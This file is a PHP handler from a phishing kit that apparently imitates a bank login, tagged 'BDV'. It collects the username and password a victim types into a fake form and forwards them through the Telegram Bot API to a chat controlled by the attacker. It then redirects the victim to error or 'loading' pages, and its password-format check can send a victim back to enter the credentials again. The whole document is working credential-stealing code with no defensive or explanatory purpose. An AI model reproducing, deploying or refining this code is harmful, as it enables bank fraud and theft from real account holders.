<?php
error_reporting(0);

// Configuración de Telegram
require 'config.php';

// Iniciar sesión
session_start();

// Datos del formulario
$nombre = isset($_POST['nombre']) ? $_POST['nombre'] : '';
$contra = isset($_POST['contra']) ? $_POST['contra'] : '';

// Almacenar el nombre en la sesión (solo el nombre)
session_start();
$_SESSION['nombre'] = $nombre; // Almacenamos el nombre en la sesión

// Comprobar si el nombre contiene solo números
if (is_numeric($nombre)) {
    // Si el nombre es solo números, enviar los datos a Telegram y redirigir a error.html
    $message = "BDV 🆕 \n\n👤Nombre: " . $nombre;
    if (!empty($contra)) {
        $message .= "\n🔑Contraseña: " . $contra;
    }
    
    // Enviar el mensaje a Telegram usando file_get_contents
    $telegramApiUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($message);
    $response = file_get_contents($telegramApiUrl);

    // Redirigir a error.php
    header('Location: error.php');
    exit();
}

// Expresión regular para validar el formato de la contraseña
$pattern = '/^(?=.*[A-Z])(?=.*\d)(?=.*[^a-zA-Z0-9\s]).{8,}$/';

// Componer el mensaje para enviar a Telegram
$message = "BDV 🆕 \n\n👤Nombre: " . $nombre;
if (!empty($contra)) {
    $message .= "\n🔑Contraseña: " . $contra;
}
$message .= "";

// Enviar el mensaje a Telegram usando file_get_contents
$telegramApiUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($message);
$response = file_get_contents($telegramApiUrl);

// Verificar si la contraseña cumple con el formato
if (!empty($contra) && !preg_match($pattern, $contra)) {
    // Redirigir a error.html si la contraseña no cumple el formato
    header('Location: error.php');
    exit();
}

// Si la contraseña es válida, redirigir a cargando.html
if (!empty($contra)) {
    header('Location: cargando.html');
    exit();
} else {
    // Devolver una respuesta simple cuando solo se envía el nombre
    echo "Nombre enviado";
}
?>
